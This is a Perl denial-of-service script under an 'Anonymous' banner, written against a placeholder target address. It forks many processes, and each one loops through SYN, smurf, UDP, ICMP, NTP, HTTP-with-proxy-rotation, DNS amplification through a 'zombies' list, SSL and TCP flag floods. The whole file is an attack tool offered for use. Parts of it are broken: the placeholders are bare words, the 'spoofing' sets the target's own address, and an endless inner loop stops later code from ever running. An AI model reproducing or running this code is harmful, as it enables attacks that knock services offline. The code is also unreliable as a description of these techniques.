use IO::Socket::INET;
use Net::Ping;
use Net::RawIP;
use LWP::UserAgent;
use Crypt::SSLeay;
use Net::DNS;
use Net::Packet::UDP;
use Net::Packet::ICMP;
use strict;
use warnings;

my $banner = <<'END_BANNER';

 ▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
 ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
▒▒    ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░
                                         ░                  ░        ░         ░ ░                       ░          

END_BANNER

print $banner;

my $target_ip = "TARGET_IP_ADDRESS";
my $target_port = TARGET_PORT;
my $packet_size = PACKET_SIZE;
my $num_threads = NUM_THREADS;

# Read HTTP proxy txt file
my @proxies;
open(my $proxy_file, '<', 'http.txt') or die "Could not open proxies.txt: $!";
while (my $line = <$proxy_file>) {
    chomp $line;
    push @proxies, $line;
}
close($proxy_file);

# Create a socket
my $socket = IO::Socket::INET->new(
    PeerAddr => $target_ip,
    PeerPort => $target_port,
    Proto => "tcp"
);

# Generate random data for DDoS packets
sub generate_random_data {
    my $size = shift;
    my @chars = ('A'..'Z', 'a'..'z', '0'..'9');
    my $data = '';
    for (1..$size) {
        $data .= $chars[rand @chars];
    }
    return $data;
}

# Read useragents.txt file
my @useragents;
open(my $ua_file, '<', 'ua.txt') or die "Could not open useragents.txt: $!";
while (my $line = <$ua_file>) {
    chomp $line;
    push @useragents, $line;
}
close($ua_file);

# Read Zombies.txt file
my @zombies;
open(my $zombies_file, '<', 'zombies.txt') or die "Could not open Zombies.txt: $!";
while (my $line = <$zombies_file>) {
    chomp $line;
    push @zombies, $line;
}
close($zombies_file);

# Create multiple threads to send DDoS packets
for (my $i = 0; $i < $num_threads; $i++) {
    my $pid = fork();
    if ($pid) {
        # Parent process, continue creating more threads
        next;
    } elsif ($pid == 0) {
        # Child process, send DDoS packets
        while (1) {
            my $data = generate_random_data($packet_size);
            $socket->send($data);

            # SYN Flood Attack
            my $syn_socket = Net::RawIP->new({ ip => { saddr => $target_ip }, tcp => { dest => $target_port, syn => 1 } });
            $syn_socket->send;

            # Smurf Attack
            my $ping = Net::Ping->new();
            $ping->broadcast(1);
            $ping->ping($target_ip);

            # DNS Spoofing
            my $dns_packet = Net::DNS::Packet->new("example.com", "A", "IN");
            $dns_packet->header->qr(1);
            $dns_packet->header->opcode("UPDATE");
            $dns_packet->header->ra(1);
            $dns_packet->header->rd(1);
            $dns_packet->header->qr(1);
            $dns_packet->header->qdcount(1);
            $dns_packet->header->ancount(1);
            $dns_packet->header->nscount(1);
            $dns_packet->header->arcount(1);

            my $udp_socket = Net::Packet::UDP->new(dst_ip => $target_ip, dst_port => 53);
            $udp_socket->data($dns_packet->data);
            $udp_socket->send;

            # Volumetric Attacks
            my $udp_socket2 = IO::Socket::INET->new(
                PeerAddr => $target_ip,
                PeerPort => $target_port,
                Proto => "udp"
            );
            $udp_socket2->send($data);

            my $icmp_socket = Net::Packet::ICMP->new;
            $icmp_socket->set({icmp => {type => ICMP_ECHO, code => 0}});
            $icmp_socket->send;

            # NTP Flood
            my $ntp_packet = "a" x $packet_size;
            my $ntp_socket = IO::Socket::INET->new(
                PeerAddr => $target_ip,
                PeerPort => 123,
                Proto => "udp"
            );
            $ntp_socket->send($ntp_packet);

            # Layer 7 Attacks
            my $http_socket = IO::Socket::INET->new(
                PeerAddr => $target_ip,
                PeerPort => 80,
                Proto => "tcp"
            );
            $http_socket->send("GET / HTTP/1.1\r\nHost: $target_ip\r\nUser-Agent: $useragents[rand @useragents]\r\n\r\n");

            # DNS Amplification Attacks
            my $dns_query = Net::DNS::Packet->new("example.com", "ANY", "IN");
            my $dns_socket = IO::Socket::INET->new(
                PeerAddr => $zombies[rand @zombies],
                PeerPort => 53,
                Proto => "udp"
            );
            my $dns_data = $dns_query->data;
            $dns_socket->send($dns_data);

            # UDP Spoof Flood
            my $spoof_socket = IO::Socket::INET->new(
                Proto => 'udp',
                LocalPort => $target_port,
                LocalAddr => $target_ip
            );
            my $spoof_packet = generate_random_data($packet_size);
            $spoof_socket->send($spoof_packet);

            # HTTP Flood with Dynamic Proxy Rotation
            my $ua = LWP::UserAgent->new;
            $ua->timeout(10);
            $ua->agent($useragents[rand @useragents]);
            my $proxy = $proxies[rand @proxies];
            $ua->proxy(['http', 'https'], $proxy);
            while (1) {
                my $http_response = $ua->get("http://$target_ip");
            }

            # SSL/TLS Flood
            my $ssl_socket = IO::Socket::INET->new(
                PeerAddr => $target_ip,
                PeerPort => 443,
                Proto => "tcp"
            );
            my $ssl_data = generate_random_data($packet_size);
            $ssl_socket->send($ssl_data);

            # TCP Flood Attacks
            my $tcp_socket = IO::Socket::INET->new(
                PeerAddr => $target_ip,
                PeerPort => $target_port,
                Proto => "tcp"
            );
            $tcp_socket->send($data);

            my $ack_socket = Net::RawIP->new({ ip => { saddr => $target_ip }, tcp => { dest => $target_port, ack => 1 } });
            $ack_socket->send;

            my $rst_socket = Net::RawIP->new({ ip => { saddr => $target_ip }, tcp => { dest => $target_port, rst => 1 } });
            $rst_socket->send;

            my $fin_socket = Net::RawIP->new({ ip => { saddr => $target_ip }, tcp => { dest => $target_port, fin => 1 } });
            $fin_socket->send;
        }
    }
}
